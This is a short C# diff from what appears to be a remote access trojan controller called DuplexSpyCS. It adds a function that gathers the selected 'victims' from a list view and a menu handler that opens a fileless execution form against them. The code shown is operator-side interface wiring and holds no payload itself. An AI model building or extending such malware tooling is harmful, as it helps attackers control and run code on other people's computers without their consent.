@@ -29,6 +29,19 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
+        /// <summary>
+        /// Return a list of victim from listview selected items.
+        /// </summary>
+        /// <returns></returns>
+        private List<Victim> fnlsGetSelectedVictims()
+        {
+            List<Victim> lsVictim = new List<Victim>();
+            foreach (ListViewItem item in listView1.SelectedItems)
+                lsVictim.Add(GetVictim(item));
+
+            return lsVictim;
+        }
+
         public List<Victim> GetAllVictim()
         {
             List<Victim> lsVictim = new List<Victim>();
@@ -2009,6 +2022,18 @@ namespace DuplexSpyCS
         {
             string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[5].Text).ToArray());
             Clipboard.SetText(szText);
+        }
+
+        private void toolStripMenuItem40_Click(object sender, EventArgs e)
+        {
+            List<Victim> lsVictim = fnlsGetSelectedVictims();
+            if (lsVictim.Count == 0)
+                return;
+
+            frmFilelessExec f = new frmFilelessExec();
+            f.m_lsVictim = lsVictim;
+
+            f.Show();
         }
     }
 }
